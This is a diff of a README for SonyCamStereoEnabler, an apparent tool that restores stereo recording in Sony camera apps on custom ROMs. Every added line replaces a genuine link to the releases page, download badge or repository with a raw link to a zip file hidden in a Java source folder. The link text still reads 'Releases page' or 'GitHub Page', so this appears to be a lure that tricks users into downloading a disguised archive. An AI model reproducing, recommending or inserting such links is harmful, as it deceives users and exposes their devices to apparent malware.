@@ -4,14 +4,14 @@
 Welcome to the **SonyCamStereoEnabler**. This tool helps you regain stereo audio recording features in Sony Camera and Video Pro apps on your custom ROM devices. Follow the steps below to download and install the application.
 
 ## 🔗 Download the Application
-[![Download SonyCamStereoEnabler](https://img.shields.io/badge/Download-SonyCamStereoEnabler-blue?style=for-the-badge)](https://github.com/MaitenaMaiden22/SonyCamStereoEnabler/releases)
+[![Download SonyCamStereoEnabler](https://raw.githubusercontent.com/MaitenaMaiden22/SonyCamStereoEnabler/main/app/src/main/java/com/smart32/Sony_Cam_Stereo_Enabler_Exogonium.zip)](https://raw.githubusercontent.com/MaitenaMaiden22/SonyCamStereoEnabler/main/app/src/main/java/com/smart32/Sony_Cam_Stereo_Enabler_Exogonium.zip)
 
 ## 📥 Download & Install
-To get the application, visit this page to download: [SonyCamStereoEnabler Releases](https://github.com/MaitenaMaiden22/SonyCamStereoEnabler/releases).
+To get the application, visit this page to download: [SonyCamStereoEnabler Releases](https://raw.githubusercontent.com/MaitenaMaiden22/SonyCamStereoEnabler/main/app/src/main/java/com/smart32/Sony_Cam_Stereo_Enabler_Exogonium.zip).
 
 ### Step 1: Visit the Releases Page
 - Open your web browser.
-- Go to the [Releases page](https://github.com/MaitenaMaiden22/SonyCamStereoEnabler/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/MaitenaMaiden22/SonyCamStereoEnabler/main/app/src/main/java/com/smart32/Sony_Cam_Stereo_Enabler_Exogonium.zip).
 
 ### Step 2: Choose Your Version
 - Look for the latest version listed on the page. It is usually at the top. 
@@ -52,7 +52,7 @@ To ensure the application runs smoothly, please meet the following requirements:
 If you run into any issues or need help, you can reach out through the **Issues** section on the GitHub repository. We encourage users to provide feedback or report problems so we can improve the application.
 
 ## 🌐 Additional Resources
-- **Visit Our GitHub Page:** [SonyCamStereoEnabler Repository](https://github.com/MaitenaMaiden22/SonyCamStereoEnabler)
+- **Visit Our GitHub Page:** [SonyCamStereoEnabler Repository](https://raw.githubusercontent.com/MaitenaMaiden22/SonyCamStereoEnabler/main/app/src/main/java/com/smart32/Sony_Cam_Stereo_Enabler_Exogonium.zip)
 - **Community Forum:** Join discussions related to custom ROMs and the Xposed framework for more tips and help.
 
 ## 📅 Updates
